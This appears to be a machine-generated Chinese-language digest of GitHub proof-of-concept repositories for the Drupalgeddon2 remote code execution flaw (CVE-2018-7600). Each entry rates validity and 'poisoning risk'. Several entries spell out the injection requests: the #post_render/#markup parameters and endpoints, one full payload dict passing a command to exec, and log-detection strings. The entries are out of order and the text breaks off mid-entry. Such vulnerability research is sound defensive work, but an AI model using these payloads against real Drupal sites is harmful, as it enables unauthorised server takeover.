**来源**: [CVE-2018-7600-shellord_CVE-2018-7600-Drupal-RCE.md](../2018/CVE-2018-7600-shellord_CVE-2018-7600-Drupal-RCE.md)

## CVE-2018-7600-Drupal-RCE

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，可导致服务器完全控制

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** 目标Drupal站点未打补丁且存在默认或常见模块配置

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-7600，又名Drupalgeddon2，是一个Drupal核心的远程代码执行漏洞。漏洞原因是由于多个子系统存在输入验证不足的问题，允许远程攻击者执行任意代码。

**有效性：**
提供的POC代码（Drupal-RCE-Mass-Exploiter.py）针对Drupal 7和Drupal 8的不同利用方式。对于Drupal 7，它利用`user/password`表单的`#post_render`属性和`file/ajax`端点。对于Drupal 8，它利用`user/register`表单的`timezone`字段。

根据漏洞库信息和搜索引擎结果，此漏洞利用代码是有效的，多个Exploit-DB条目 (44482, 44448, 44449)和安全博客(Rapid7, Palo Alto Networks, Tenable等)确认了其存在和严重性，并且在实际环境中被广泛利用。

**投毒风险：**
此脚本本身主要功能是批量检测和利用漏洞，但仍存在潜在的投毒风险：

*   **命令执行：** 脚本允许通过`COMMAND`变量指定要执行的命令，如果攻击者修改了脚本并分享给他人，可能会将`COMMAND`设置为恶意代码。
*   **后门植入：** 虽然未直接观察到后门代码，但如果恶意用户分发修改后的版本，它们可能会添加后门植入代码，例如添加管理员账户或修改核心文件。
*   **代理风险：** 脚本支持使用代理，恶意代理服务器可能会窃取受害者服务器的敏感信息。

总体来说，脚本的投毒风险较低，约为10%，因为其主要功能是漏洞利用，但使用前仍需仔细审查代码。

**利用方式：**

1.  **Drupal 7:**
    *   利用`user/password`表单中的`name[#post_render]`属性执行命令。攻击者构造一个包含恶意PHP代码的请求，该代码将在服务器上执行。
    *   使用`file/ajax`端点来触发命令执行。
2.  **Drupal 8:**
    *   利用`user/register`表单中的`timezone`字段和`#post_render`属性执行命令。
    *   构造包含恶意PHP代码的AJAX请求，并在服务器端执行。

**总结：**
CVE-2018-7600是一个高危的远程代码执行漏洞，影响多个Drupal版本。提供的POC代码是有效的，但使用前需要仔细审查，以避免潜在的投毒风险。攻击者可以利用此漏洞获取服务器的完全控制权。

**项目地址:** [shellord/CVE-2018-7600-Drupal-RCE](https://github.com/shellord/CVE-2018-7600-Drupal-RCE)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #26

**来源**: [CVE-2018-7600-shellord_Drupalgeddon-Mass-Exploiter.md](../2018/CVE-2018-7600-shellord_Drupalgeddon-Mass-Exploiter.md)

## CVE-2018-7600 - Drupalgeddon2

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Drupal

**危害等级:** 高危，允许未经身份验证的远程攻击者执行任意代码

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** 目标系统运行存在漏洞的Drupal版本，且允许外部网络访问。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-7600 (Drupalgeddon2) 是一个存在于Drupal核心中的远程代码执行漏洞。该漏洞源于对用户提供的输入验证不足，允许攻击者在服务器上执行任意代码。

**有效性:**
根据漏洞库信息、搜索结果和提供的漏洞利用代码，该漏洞利用的有效性很高。漏洞库信息明确指出该漏洞允许远程代码执行，搜索结果表明存在大量针对该漏洞的利用尝试，并且已经有公开的Exploit-DB条目。提供的Python代码 `mass.py` 实现了对Drupal 7 和 Drupal 8的批量漏洞利用，进一步证明了漏洞的可利用性。

**投毒风险:**
分析提供的`mass.py`代码，发现该代码主要功能是批量检测和利用Drupal的CVE-2018-7600和CVE-2018-7602漏洞。代码结构清晰，包含漏洞检测和利用的核心逻辑，没有明显的恶意或隐藏功能。但是,批量漏洞利用脚本本身如果被恶意使用，例如，大规模扫描和攻击未经授权的系统，也存在一定的潜在风险。 `README.md` 文件描述了脚本的用法，包括指定目标列表、输出文件、worker数量和代理等，以及要利用的漏洞编号。
代码中存在使用eval或者其他类似的高危函数的情况，攻击者可能会篡改`COMMAND`变量来执行恶意操作。这种潜在的风险主要来自于用户的不当使用或者受到攻击者恶意篡改的情况，而不是代码作者有意植入后门。

**利用方式:**
1.  **Drupal 7:**
    *   利用 `user/password` 路径，通过构造特定的GET和POST参数，触发`passthru`函数执行命令。
    *   首先发送包含恶意payload的POST请求到 `user/password`，触发 Drupal 的渲染过程。
    *   然后从返回的 HTML 中提取 `form_build_id`。
    *   最后再次发送包含`form_build_id`的POST请求到 `file/ajax/name/#value/{form_build_id}`，从而执行恶意代码。
2.  **Drupal 8:**
    *   利用 `user/register` 路径，通过构造特定的GET和POST参数，触发`exec`函数执行命令。
    *   构造包含恶意payload的POST请求到 `/user/register`。
漏洞利用依赖于未打补丁的Drupal版本中存在的输入验证漏洞，攻击者可以利用这些漏洞执行任意PHP代码，从而完全控制受影响的系统。

**项目地址:** [shellord/Drupalgeddon-Mass-Exploiter](https://github.com/shellord/Drupalgeddon-Mass-Exploiter)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #27

**来源**: [CVE-2018-7600-soch4n_CVE-2018-7600.md](../2018/CVE-2018-7600-soch4n_CVE-2018-7600.md)

## CVE-2018-7600-Drupal-RCE

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，允许未经身份验证的远程攻击者在服务器上执行任意代码

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** 目标Drupal站点未打补丁，并且使用了默认或常见的模块配置。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2018-7600（Drupalgeddon 2）是一个影响Drupal核心的远程代码执行漏洞。该漏洞源于Drupal在处理用户输入时存在缺陷，导致攻击者可以在未经身份验证的情况下，通过构造特制的请求来执行任意代码。PoC代码利用了`user/register`接口的Ajax功能，通过`element_parents`参数注入恶意代码。攻击者通过操纵`mail[\"a\"][#lazy_builder][0]`和`mail[\"a\"][#lazy_builder][1][]`参数，将`system`函数和`ls -la`命令注入到Drupal的渲染过程中，从而执行系统命令。提供的代码没有明显的投毒迹象，它是一个直接的漏洞利用程序，旨在展示漏洞的存在并执行任意命令。 多个来源证实该漏洞影响了大量Drupal站点，并导致大规模攻击。

**项目地址:** [soch4n/CVE-2018-7600](https://github.com/soch4n/CVE-2018-7600)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #28

**来源**: [CVE-2018-7600-tea-celikik_Drupal-Exploit-Lab.md](../2018/CVE-2018-7600-tea-celikik_Drupal-Exploit-Lab.md)

## CVE-2018-7600 Drupalgeddon2

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Drupal

**危害等级:** 高危，允许未经身份验证的远程攻击者执行任意代码，完全控制受影响的Drupal站点。

**影响版本:** Drupal 7.x (< 7.58), 8.x (< 8.3.9), 8.4.x (< 8.4.6), and 8.5.x (< 8.5.1)

**利用条件:** 目标Drupal站点必须是受影响的版本，且没有应用相应的安全补丁。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2018-7600（Drupalgeddon2）是一个Drupal核心的远程代码执行漏洞。根据漏洞库信息和搜索结果，该漏洞影响多个Drupal版本，允许未经身份验证的攻击者执行任意代码。漏洞利用代码展示了使用Metasploit的drupalgeddon2模块进行攻击的流程。 

**有效性：**
提供的POC代码基于Metasploit的`drupalgeddon2`模块，该模块是公开可用的，并且被广泛用于验证和利用此漏洞。因此，POC代码的**有效性很高**，如果目标满足漏洞利用条件，则能够成功执行。

**投毒风险：**
查看提供的漏洞利用代码，该代码主要是安装和配置Drupal 7.57以及使用Metasploit模块进行渗透测试的步骤。它还包含启用 ModSecurity 作为 WAF 的操作，并测试其防御能力，然后尝试使用 Metasploit 进行攻击。最后，展示了即使有WAF存在，攻击也失败了，没有打开 Meterpreter 会话。

虽然代码的本意是演示漏洞利用与防御，但依然存在极小的投毒风险：

*   环境配置脚本中，如果作者在安装包下载链接上做了手脚，替换成了恶意版本，存在投毒的可能性。但这部分可以通过校验安装包的HASH值来规避。
*   在ModSecurity规则配置中，如果包含了恶意的排除规则，则可能降低WAF的防御能力。然而，提供的配置看起来相对标准。考虑到该项目主要关注漏洞利用演示，而并非恶意软件分发，**投毒风险较低，估计在5%左右。**

**利用方式：**
1.  攻击者识别出运行着未修补的Drupal版本的站点。
2.  攻击者构造恶意请求，通常涉及`q`参数（Drupal的路径处理机制）。
3.  恶意请求利用了Drupal的某些组件对用户输入验证不足的缺陷。
4.  恶意请求导致在服务器上执行任意PHP代码，从而实现远程代码执行。
5.  可以使用Metasploit的`drupalgeddon2`模块自动化漏洞利用过程，或者手动构造payload。

**总结：**
CVE-2018-7600是一个严重的远程代码执行漏洞，利用方式相对简单，且有公开的Metasploit模块可用。尽管代码本身演示了漏洞利用和防御，但仍需警惕潜在的投毒风险。强烈建议受影响的Drupal站点尽快升级到安全版本。

**项目地址:** [tea-celikik/Drupal-Exploit-Lab](https://github.com/tea-celikik/Drupal-Exploit-Lab)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #29

**来源**: [CVE-2018-7600-thehappydinoa_CVE-2018-7600.md](../2018/CVE-2018-7600-thehappydinoa_CVE-2018-7600.md)

## CVE-2018-7600 Drupalgeddon2 RCE

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，允许远程攻击者执行任意代码

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** 目标Drupal站点版本在受影响范围内，且存在默认或常见的模块配置。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-7600，又名Drupalgeddon2，是一个Drupal核心的远程代码执行漏洞。该漏洞源于Drupal在处理某些用户输入时存在缺陷，允许未经身份验证的攻击者通过构造特殊的请求来执行任意代码。

**有效性分析：**

*   漏洞库信息和搜索引擎结果均表明该漏洞是一个严重的安全问题，影响多个Drupal版本，并允许远程代码执行。
*   提供的POC代码尝试通过`drupal_ajax`接口注册用户，并利用`exec` markup执行bash命令。POC会执行`id`命令，并将结果写入一个随机名称的文件中，然后尝试通过HTTP访问该文件以验证漏洞利用是否成功。成功后，会尝试删除该文件。
*   多个Exploit-DB链接（如44448, 44449, 44482）表明存在公开可用的漏洞利用代码。

综合来看，提供的POC代码是有效的，可以用来验证目标Drupal站点是否存在CVE-2018-7600漏洞。

**投毒风险分析：**

*   POC代码本身主要功能是执行命令并将结果写入文件，之后验证文件是否可访问，以验证漏洞存在性。这种模式本身存在潜在的投毒风险，攻击者可以将恶意代码注入到被写入的文件中，或者修改POC使其执行更具破坏性的操作。
*   代码中`random_file_name`变量虽然使用了随机文件名，但如果被成功利用，攻击者可以精确控制写入内容和删除操作，因此存在恶意利用的可能性。
*   `download_command` 和 `rm_command` 如果被篡改，可能导致下载恶意文件或删除重要文件，因此也有潜在风险。
*   `tor_proxy`选项的存在意味着该POC可能被用于隐藏攻击者的真实IP地址，这增加了追踪和溯源的难度。
*   综合代码，投毒风险评估为10%。主要是因为POC的主要目的是验证漏洞，而大规模恶意利用需要在代码层面进行显著修改。

**利用方式分析：**

1.  **构造恶意请求：** 攻击者发送包含恶意代码的特殊构造的HTTP请求到Drupal站点。
2.  **利用`drupal_ajax`接口：** POC利用Drupal的`drupal_ajax`接口来触发漏洞。
3.  **远程代码执行：** 恶意代码通过Drupal的输入处理缺陷被执行，导致远程代码执行。
4.  **验证与清理（POC）：** POC验证代码执行成功后，会尝试清理现场（删除创建的文件）。实际攻击中，攻击者可能会执行更具破坏性的操作，例如安装后门、窃取数据或篡改网站内容。

**项目地址:** [thehappydinoa/CVE-2018-7600](https://github.com/thehappydinoa/CVE-2018-7600)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #30

**来源**: [CVE-2018-7600-vphnguyen_ANM_CVE-2018-7600.md](../2018/CVE-2018-7600-vphnguyen_ANM_CVE-2018-7600.md)

## CVE-2018-7600-Drupal-RCE

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，可导致完全控制受影响的 Drupal 站点

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** 目标Drupal站点存在漏洞且可网络访问

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2018-7600，又名 Drupalgeddon2，是一个存在于 Drupal 多个子系统中的远程代码执行漏洞。该漏洞源于 Drupal 在处理用户提供的输入时，没有进行充分的验证，攻击者可以通过精心构造的恶意请求，在服务器上执行任意代码。 

**有效性分析：**
根据漏洞库信息和搜索结果，该漏洞是一个经过验证的远程代码执行漏洞，并且存在公开可用的利用代码。大量的安全厂商和研究人员对此漏洞进行了分析和验证，证明其有效性。 

**投毒风险分析：**
提供的Python代码是一个网络数据包捕获脚本，主要用于分析网络流量，特别是HTTP流量，并检测其中是否存在CVE-2018-7600漏洞的利用尝试。 

*   **功能：** 该脚本使用 `pyshark` 库捕获网络接口上的数据包，并分析HTTP请求的URI和POST数据。它查找包含特定关键字（如`exec`, `passthru`, `system`等）的请求，这些关键字通常与远程代码执行攻击相关。  该脚本主要用于检测已知的攻击模式，而不是发起攻击。

*   **潜在投毒风险：** 虽然该脚本本身主要是用于流量分析，但仍然存在一些潜在的风险：
    *   **性能影响：** 在高流量环境下，该脚本可能会消耗大量的CPU和内存资源，导致系统性能下降。 这种消耗如果被恶意利用，可以作为一种拒绝服务攻击。
    *   **数据泄露：** 该脚本会捕获网络数据包，其中可能包含敏感信息，例如用户名、密码、API密钥等。 如果脚本的输出被不当存储或泄露，可能会导致数据泄露。
    *   **依赖风险：** `pyshark` 依赖 `tshark`，如果 `tshark` 本身存在安全漏洞，可能会影响该脚本的安全性。
    *  **后门代码：**代码中没有明显的恶意后门代码，但捕获流量到`csv`文件中可能导致信息泄露，如果该文件可以被外部访问，或者被攻击者替换，则存在风险。

**利用方式：**
根据搜索结果和漏洞描述，攻击者可以通过以下方式利用该漏洞：

1.  发送包含恶意代码的特制HTTP请求，恶意代码通常会嵌入到URL参数或POST数据中。
2.  Drupal 的某些子系统（例如节点创建、用户注册等）在处理这些请求时，由于输入验证不足，会将恶意代码传递给PHP的 `eval()` 函数或其他类似函数执行，从而导致远程代码执行。
3.  攻击者可以利用执行的代码在服务器上安装后门、窃取数据或执行其他恶意操作。

综上，该漏洞利用的有效性很高，但提供的POC代码本身更多是流量分析工具，直接投毒风险较低(5%), 但需要注意潜在的性能影响、数据泄露和依赖风险。攻击者主要通过构造恶意 HTTP 请求来触发漏洞。

**项目地址:** [vphnguyen/ANM_CVE-2018-7600](https://github.com/vphnguyen/ANM_CVE-2018-7600)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #31

**来源**: [CVE-2018-7600-xxxTectationxxx_CVE-2018-7600.md](../2018/CVE-2018-7600-xxxTectationxxx_CVE-2018-7600.md)

## CVE-2018-7600 - Drupalgeddon2 RCE

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Drupal

**危害等级:** 高危，允许未经身份验证的攻击者执行任意代码

**影响版本:** Drupal 7.x (before 7.58), 8.x (before 8.3.9), 8.4.x (before 8.4.6), and 8.5.x (before 8.5.1)

**利用条件:** 目标Drupal站点未打补丁，并且存在默认或常见模块配置。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2018-7600（Drupalgeddon2）是一个存在于Drupal核心中的远程代码执行漏洞。根据漏洞信息和搜索结果，此漏洞影响多个子系统，利用方式是通过构造特殊的请求，特别是利用`user/password` endpoint，结合`#post_render`属性，触发PHP的`passthru()`函数来执行任意命令。

**有效性：**

提供的PoC代码通过两个步骤利用该漏洞：

1.  发送一个包含恶意参数的POST请求到`user/password`，利用`name[#post_render][]`，`name[#markup]`和`name[#type]`参数注入命令。
2.  从响应中提取`form_build_id`，然后发送另一个包含该`form_build_id`的请求到`file/ajax/name/#value/{form_build_id}`，以触发命令执行。

根据提供的漏洞库信息、搜索结果以及利用代码，可以判断此POC代码是**有效**的，可以利用未修复的Drupal站点执行远程代码。

**投毒风险：**

评估PoC代码是否存在投毒风险：

*   代码相对简短，易于审查。
*   代码的主要功能是利用已知的Drupal漏洞执行命令，没有发现明显的恶意行为。
*   虽然代码中没有直接发现投毒代码，但是任何代码都存在被恶意修改的风险。例如，攻击者可能会修改命令执行部分，使其在执行用户指定的命令之前或之后执行其他恶意操作。

尽管直接投毒证据不多，但考虑到软件供应链的安全风险，以及任何代码都可能被篡改的可能性，综合评估投毒风险为**5%**。这个评估考虑了代码本身的简洁性以及潜在的供应链攻击风险。

**利用方式：**

1.  攻击者首先构造一个包含恶意参数的POST请求，发送到目标Drupal站点的`user/password`路径。
2.  该请求利用了Drupal的表单渲染机制中的漏洞，允许攻击者注入并执行PHP代码。
3.  服务器响应包含一个`form_build_id`，攻击者需要提取该ID。
4.  攻击者使用提取的`form_build_id`构造第二个POST请求，发送到`file/ajax/name/#value/{form_build_id}`路径。
5.  这个请求触发Drupal执行之前注入的PHP代码，从而实现远程代码执行。

通过这种方式，攻击者可以在未经身份验证的情况下，在目标Drupal服务器上执行任意命令，从而完全控制受影响的系统。

**项目地址:** [xxxTectationxxx/CVE-2018-7600](https://github.com/xxxTectationxxx/CVE-2018-7600)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #32

**来源**: [CVE-2018-7600-ynsmroztas_drupalhunter.md](../2018/CVE-2018-7600-ynsmroztas_drupalhunter.md)

## CVE-2018-7600 Drupalgeddon2 RCE

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，允许未经身份验证的攻击者执行任意代码

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** 目标Drupal站点存在漏洞且网络可达

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-7600（Drupalgeddon2）是一个存在于Drupal核心中的远程代码执行漏洞。根据漏洞库信息和搜索结果，该漏洞影响多个子系统，常见模块配置也可能受到影响。大量Drupal网站受到影响。 

**有效性：**

提供的Python POC代码利用了Drupal的多个漏洞组合来实现远程代码执行。它通过构造特定的请求参数，包括`q`、`name[#post_render][]`、`name[#markup]`和`name[#type]`，以及提交`form_id`和`_triggering_element_name`来触发漏洞。然后，它解析响应以获取`form_build_id`，并使用它来发送另一个请求以执行任意命令。 搜索引擎结果中的多个条目表明该漏洞被广泛利用。

**投毒风险：**

虽然POC代码本身是为了演示漏洞利用而编写的，但存在一定的投毒风险。  如果攻击者修改了POC代码，例如，将command参数修改成下载恶意脚本并执行，那么该POC可以被用来传播恶意软件。 由于代码逻辑相对简单，作者在其中隐藏复杂后门的可能性较低。但是，无法完全排除，所以投毒风险定为10%。

**利用方式：**

1.  攻击者首先构造包含恶意参数的POST请求到目标Drupal站点的`/user/password`路径。
2.  恶意参数包括`q`设置为`user/password`，以及使用`name[#post_render][]`，`name[#markup]`和`name[#type]`来注入要执行的操作系统命令。
3.  服务器响应包含`form_build_id`。
4.  攻击者使用`form_build_id`构造另一个POST请求到`/file/ajax/name/#value/{form_build_id}`，执行先前注入的命令。
5.  命令执行的结果将返回给攻击者。

**项目地址:** [ynsmroztas/drupalhunter](https://github.com/ynsmroztas/drupalhunter)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #33

**来源**: [CVE-2018-7600-zhzyker_CVE-2018-7600-Drupal-POC-EXP.md](../2018/CVE-2018-7600-zhzyker_CVE-2018-7600-Drupal-POC-EXP.md)

## CVE-2018-7600-Drupal-RCE

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** Drupal网站启用了默认或常见模块配置，且未打补丁

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2018-7600，又名Drupalgeddon 2，是一个Drupal核心的远程代码执行漏洞。该漏洞源于Drupal在处理某些用户输入时，未进行充分的验证和过滤，导致攻击者可以通过构造恶意的请求参数，在服务器上执行任意代码。

**有效性：**

根据漏洞库信息、搜索引擎结果以及提供的POC代码，可以判断该漏洞利用的有效性很高。漏洞库和搜索引擎结果均表明该漏洞是真实的，且存在公开可用的漏洞利用代码。提供的POC代码 `cve-2018-7600_cmd.py`  能够成功利用该漏洞在目标Drupal服务器上执行任意命令。

**投毒风险：**

仔细审查提供的POC代码 `cve-2018-7600_cmd.py`，初步判断投毒风险较低。代码逻辑较为清晰，主要功能是构造恶意请求，利用Drupal的漏洞执行命令。其中`/exphub.txt`是漏洞利用后留下的命令执行记录，方便查看命令执行情况。

需要注意的是，任何公开的漏洞利用代码都存在被修改和二次发布的风险，攻击者可能在其中添加恶意代码。因此，在使用任何漏洞利用代码前，都应该进行仔细审查，并确保来源可靠。但此仓库只有两个文件且内容较少,投毒风险评估为5%。

**利用方式：**

该漏洞的利用方式主要包括以下步骤：

1.  **确定目标Drupal网站版本：** 攻击者需要确定目标Drupal网站的版本是否在漏洞影响范围内。
2.  **构造恶意请求：** 攻击者需要构造包含恶意代码的请求，其中恶意代码将通过`mail[#markup]`传递给`exec`函数执行。请求的URL为`/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax`，请求方式为POST，并包含特定的payload，例如`{'form_id': 'user_register_form', '_drupal_ajax': '1', 'mail[#post_render][]': 'exec', 'mail[#type]': 'markup', 'mail[#markup]': ''+cmd+' | tee exphub.txt'}`。
3.  **发送恶意请求：** 攻击者将构造的恶意请求发送给目标Drupal网站。
4.  **执行任意代码：** 如果目标Drupal网站存在漏洞，恶意请求中的代码将被执行，攻击者从而获得服务器的控制权。

此漏洞是一个典型的输入验证漏洞，攻击者通过精心构造的输入，绕过了Drupal的安全检查，最终导致远程代码执行。

**项目地址:** [zhzyker/CVE-2018-7600-Drupal-POC-EXP](https://github.com/zhzyker/CVE-2018-7600-Drupal-POC-EXP)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---



---

## POC #2

**来源**: [CVE-2018-7600-Damian972_drupalgeddon-2.md](../2018/CVE-2018-7600-Damian972_drupalgeddon-2.md)

## CVE-2018-7600 Drupalgeddon2

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，允许未经身份验证的远程攻击者执行任意代码

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** 目标Drupal站点未打补丁，且配置允许远程访问

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2018-7600（Drupalgeddon2）是一个影响Drupal的远程代码执行漏洞。根据漏洞库信息、搜索引擎结果和提供的漏洞利用代码，可以得出以下结论：

**有效性：**

提供的POC代码是有效的漏洞检测脚本。它通过构造特定的URL和POST请求，利用Drupal中的输入验证漏洞，尝试执行任意命令。脚本会检测目标站点是否返回预期的“GOOD”字符串，以判断漏洞是否存在。

**投毒风险：**

该漏洞利用代码主要由一个PHP脚本组成，用于检测Drupal站点是否存在CVE-2018-7600漏洞。脚本的逻辑相对简单，主要功能是发送特定的HTTP请求并检查响应。主要的风险可能存在于以下几个方面：

1.  **命令执行：** 虽然脚本的目的是检测漏洞，但它确实会尝试在目标服务器上执行命令。如果脚本被恶意修改，攻击者可以更改`$command`变量，从而执行任意的恶意命令。
2.  **信息泄露：** 脚本会发送包含特定参数的HTTP请求，这些参数可能会泄露目标站点的信息。
3.  **拒绝服务（DoS）：** 如果脚本被大规模使用，可能会对目标服务器造成一定的负载，导致拒绝服务。

考虑到以上因素，认为此仓库中存在作者隐藏的投毒代码的可能性较低，约为5%。这个假设的依据是代码相对简单，容易审查，并且其主要目的是漏洞检测而非利用。

**利用方式：**

1.  **构造恶意请求：** 攻击者构造包含恶意代码的URL或POST请求，利用Drupal的多个子系统中的输入验证漏洞。
2.  **远程代码执行：** 恶意代码通过Drupal的渲染机制执行，导致远程代码执行。

具体来说，对于Drupal 7.x，POC利用`user/password`路径，通过`name[#post_render]`、`name[#type]`和`name[#markup]`参数注入PHP代码。对于Drupal 8.x，POC利用`user/register`路径，通过`element_parents`、`mail[a][#post_render]`、`mail[a][#type]`和`mail[a][#markup]`参数注入PHP代码。这些参数允许在特定情况下执行PHP代码，从而实现远程代码执行。

**总结：**

CVE-2018-7600是一个严重的安全漏洞，允许未经身份验证的攻击者在Drupal站点上执行任意代码。提供的POC代码可以有效地检测该漏洞，但使用时需要注意潜在的风险，以避免对目标系统造成损害。务必确保从可信来源获取利用代码，并在受控环境中进行测试。


**项目地址:** [Damian972/drupalgeddon-2](https://github.com/Damian972/drupalgeddon-2)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #3

**来源**: [CVE-2018-7600-Dowonkwon_drupal-cve-2018-7600-poc.md](../2018/CVE-2018-7600-Dowonkwon_drupal-cve-2018-7600-poc.md)

## CVE-2018-7600-Drupalgeddon 2

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** Drupal网站允许未授权用户访问用户注册页面或其他类似的form API接口

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-7600 (Drupalgeddon 2) 允许未经身份验证的远程攻击者在受影响的Drupal网站上执行任意代码。漏洞存在于 Drupal 的 Form API 中，通过构造特定的POST请求，可以绕过输入验证，导致代码执行。

**有效性：**
根据漏洞库信息、搜索结果和提供的POC代码，可以确认此漏洞利用是有效的。大量资料表明该漏洞已被广泛利用。

**投毒风险：**
分析提供的文件，包括`README.md`, `README.zh-cn.md`, 和 `docker-compose.yml`。这些文件主要包含漏洞描述、环境搭建说明和POC使用方法。`docker-compose.yml` 文件指定了使用 `vulhub/drupal:8.5.0` 镜像，这个镜像本身如果存在后门，可能导致投毒。此外，虽然直接的恶意代码在提供的文件中未发现，但由于攻击者能够执行任意代码，意味着他们完全有可能在目标系统上植入后门或其他恶意程序。

因此，该仓库本身直接包含投毒代码的可能性较低，但通过漏洞利用植入后门的可能性非常高，综合判断投毒风险为10%。

**利用方式：**
1.  **环境搭建：** 使用`docker-compose up -d`命令启动一个包含漏洞的Drupal环境(例如8.5.0版本)。
2.  **发送恶意请求：** 向`/user/register`或其他类似的 form API 接口发送精心构造的POST请求。该请求包含以下关键参数：
    *   `element_parents`: 用于指定表单元素路径，绕过访问控制。
    *   `ajax_form=1`: 触发 Drupal 的 AJAX 处理机制。
    *   `_wrapper_format=drupal_ajax`:  指定响应格式为 Drupal AJAX。
    *   `mail[#post_render][]`:  利用`#post_render`属性执行PHP函数（例如`exec`）。
    *   `mail[#type]=markup`:  将`mail`字段类型设置为markup，允许插入HTML代码。
    *   `mail[#markup]`:  包含要执行的命令（例如`id`）。
3.  **代码执行：** Drupal 在处理该请求时，会执行`mail[#markup]`中指定的命令，从而实现远程代码执行。

**项目地址:** [Dowonkwon/drupal-cve-2018-7600-poc](https://github.com/Dowonkwon/drupal-cve-2018-7600-poc)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #4

**来源**: [CVE-2018-7600-Hestat_drupal-check.md](../2018/CVE-2018-7600-Hestat_drupal-check.md)

## CVE-2018-7600-Drupal-RCE

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，可能导致网站被完全控制

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** Drupal网站未打补丁且存在特定模块配置（默认或常见）

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2018-7600（Drupalgeddon2）是一个Drupal核心中的远程代码执行漏洞。攻击者可以通过构造特定的HTTP请求，利用Drupal多个子系统中输入验证不足的问题，执行任意代码。从搜索结果可以看出，该漏洞影响广泛，有大量Drupal网站受到威胁。漏洞利用代码（提供的drupal-check.sh脚本）并非直接利用该漏洞进行攻击，而是用于**检测**Cpanel Apache和默认Apache配置中是否存在利用该漏洞的攻击痕迹，例如扫描访问日志中是否存在特定的payload特征。它主要通过搜索包含`system&name`、`q=user%2Fpassword&name%5B%23post_render%5D%5B%5D=passthru&name`和`?q=file%2Fajax%2Fname%2F%23value%2Fform-`等字符串的日志条目来判断是否存在攻击行为。该脚本会分析日志中攻击者IP以及可能被攻击的站点。由于给出的脚本是用于日志分析，主要作用是检测，不存在恶意投毒代码。

**利用方式：**

根据漏洞信息和搜索结果，CVE-2018-7600的利用方式如下：

